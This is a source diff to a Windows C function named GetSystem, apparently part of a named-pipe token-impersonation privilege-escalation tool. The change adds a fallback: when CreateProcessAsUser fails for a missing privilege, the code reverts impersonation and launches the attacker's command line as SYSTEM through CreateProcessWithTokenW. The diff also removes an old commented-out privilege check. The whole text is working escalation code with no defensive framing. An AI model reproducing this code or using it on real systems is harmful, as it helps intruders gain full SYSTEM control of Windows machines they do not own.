@@ -470,12 +470,6 @@ BOOL GetSystem(HANDLE hPipe)
 		goto cleanup;
 	}
 
-	//if (!CheckAndEnablePrivilege(hSystemToken, SE_ASSIGNPRIMARYTOKEN_NAME))
-	//{
-	//	wprintf(L"A privilege is missing: %ws\n", SE_ASSIGNPRIMARYTOKEN_NAME);
-	//	goto cleanup;
-	//}
-
 	if (g_dwSessionId)
 	{
 		if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
@@ -509,11 +503,40 @@ BOOL GetSystem(HANDLE hPipe)
 
 	if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
 	{
-		wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
-		goto cleanup;
-	}
+		if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
+		{
+			wprintf(L"[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n");
 
-	wprintf(L"[+] CreateProcessAsUser() OK\n");
+			RevertToSelf();
+
+			if (!g_bInteractWithConsole)
+			{
+				if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
+				{
+					wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
+					goto cleanup;
+				}
+				else
+				{
+					wprintf(L"[+] CreateProcessWithTokenW() OK\n");
+				}
+			}
+			else
+			{
+				wprintf(L"[!] CreateProcessWithTokenW() isn't compatible with option -i\n");
+				goto cleanup;
+			}
+		}
+		else
+		{
+			wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
+			goto cleanup;
+		}
+	}
+	else
+	{
+		wprintf(L"[+] CreateProcessAsUser() OK\n");
+	}
 
 	if (g_bInteractWithConsole)
 	{
